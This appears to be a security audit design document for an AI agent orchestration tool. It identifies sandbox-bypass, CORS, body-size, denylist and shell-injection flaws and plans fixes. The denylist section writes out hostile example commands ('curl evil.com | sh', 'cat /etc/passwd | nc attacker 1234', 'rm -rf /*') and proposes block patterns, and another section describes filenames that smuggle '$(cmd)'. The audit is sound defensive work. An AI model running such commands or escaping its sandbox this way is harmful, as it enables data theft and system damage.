# Security Audit — Design Document

> Date: 2026-03-10
> Auditor: architect agent

## Socratic Exploration

### What are we trying to achieve?
Identify and fix real, exploitable security vulnerabilities in the AWSL agent orchestration system. This system spawns AI agents that can read/write files and execute shell commands — security is critical because a compromised or misbehaving agent could escape its sandbox.

### Key constraints
- Local-only tool (no public network exposure expected, but dashboard has HTTP)
- Agents are semi-trusted (LLM output can be unpredictable)
- Must not break existing functionality
- Minimal code changes, focused on high-impact fixes

### What are the threat vectors?
1. **Agent escape**: A builtin-engine agent bypasses sandbox to read/write/execute outside bounds
2. **Network attack**: External actor exploits the dashboard HTTP server
3. **Data injection**: Malicious content in plan files or agent output causes command injection

---

## Verified Findings (Priority Order)

### FIX 1: Read tool has NO path restriction (HIGH)
- **File**: `src/tools.ts:21-46`
- **Issue**: `createReadTool()` does not accept or check sandbox policy. Write and Edit both call `checkWritePath()`, but Read has zero validation. Any builtin-engine agent can read ANY file on the system (e.g., `../../.env`, `C:\Users\...\credentials`).
- **Fix**: Add `sandbox?: SandboxPolicy` parameter. Add `checkReadPath()` that validates the resolved path is within `policy.writePaths` (same directories allowed for write should be readable). This is the most important fix because it's a complete sandbox bypass.

### FIX 2: Dashboard binds to all interfaces + wildcard CORS (HIGH)
- **File**: `src/dashboard.ts:45, 217`
- **Issue**: `server.listen(port)` without hostname binds to `0.0.0.0`. Combined with `Access-Control-Allow-Origin: *`, any website or network neighbor can call mutation endpoints (`/api/queue/add`, `/api/queue/clear`, `/api/history/clear`).
- **Fix**: Bind to `127.0.0.1`. Remove wildcard CORS or restrict to `http://localhost:*`.

### FIX 3: No HTTP body size limit (MEDIUM)
- **File**: `src/dashboard.ts:131, 155`
- **Issue**: `req.on("data")` accumulates body without limit. Attacker can send multi-GB payload to exhaust memory.
- **Fix**: Add 1MB body size cap. Abort request with 413 if exceeded.

### FIX 4: Coder sandbox denylist too weak (MEDIUM)
- **File**: `src/sandbox.ts:32-40`
- **Issue**: Only 7 deny patterns. Easily bypassed via:
  - `rm -rf /*` (glob instead of literal `/`)
  - `curl evil.com | sh` (download and execute)
  - `python -c "import os; os.system(...)"` (interpreter escape)
  - `node -e "require('fs').unlinkSync(...)"` (Node escape)
  - Pipe chains: `cat /etc/passwd | nc attacker 1234`
- **Fix**: Add patterns for: `rm -rf /*`, `curl.*|`, `wget.*|`, `python `, `python3 `, `node -e`, `perl -e`, `ruby -e`, `| sh`, `| bash`, `nc `, `ncat `, `> /dev/`, `eval `, `base64.*|`.

### FIX 5: Shell injection via string interpolation in git commands (MEDIUM)
- **File**: `src/planning.ts:373, 381`
- **Issue**: Uses `execSync(\`git add -- ${JSON.stringify(f)}\`)`. JSON.stringify is not a shell escaping function. A filename containing `$(cmd)` or backticks inside would be executed by the shell.
- **Fix**: Use `execFileSync("git", ["add", "--", f])` which bypasses shell entirely. Same for the commit command on line 381.

### Non-Issues (Verified Safe)
- **Prototype pollution in memory.ts**: Uses `Map`, not plain object — safe
- **Lock file TOCTOU**: Lock acquisition uses `flag: "wx"` (atomic) — correctly handled
- **Regex DoS in planning.ts**: Patterns use lazy `*?` quantifiers and are bounded — no catastrophic backtracking
- **Process.kill(pid, 0) on Windows**: Works correctly per Node.js docs, throws on dead process

---

## Implementation Plan

### Wave 1 (Critical — sandbox bypass)
| Task | File | Assignee | Description |
|------|------|----------|-------------|
| fix_1 | src/tools.ts, src/sandbox.ts | coder | Add path validation to read tool |

### Wave 2 (High — network exposure)
| Task | File | Assignee | Description |
|------|------|----------|-------------|
| fix_2 | src/dashboard.ts | coder | Bind to localhost, restrict CORS |
| fix_3 | src/dashboard.ts | coder | Add body size limit (1MB) |

### Wave 3 (Medium — defense in depth)
| Task | File | Assignee | Description |
|------|------|----------|-------------|
| fix_4 | src/sandbox.ts | coder | Expand coder denylist patterns |
| fix_5 | src/planning.ts | coder | Use execFileSync for git commands |

---

## Key Decisions & Rationale

1. **Read tool uses same writePaths for validation**: Simplest approach. If an agent can write to a directory, it can read from it. No need for separate readPaths config.

2. **Dashboard binds to 127.0.0.1 only**: This is a dev tool, not a production server. Localhost-only is the right default. Users who need network access can change it.

3. **Keep denylist for coder (don't switch to allowlist)**: Coder needs flexibility to run build tools, linters, etc. A denylist with more patterns is the right trade-off. The denylist will never be perfect, but it catches accidental/obvious misuse. True security comes from the sandbox policy being configurable per-project.

4. **execFileSync over execSync for git**: Eliminates entire class of shell injection. No performance impact. Array args are cleaner code anyway.

5. **Body size limit at 1MB**: Queue task goals are short strings. 1MB is generous. No legitimate use case needs more.
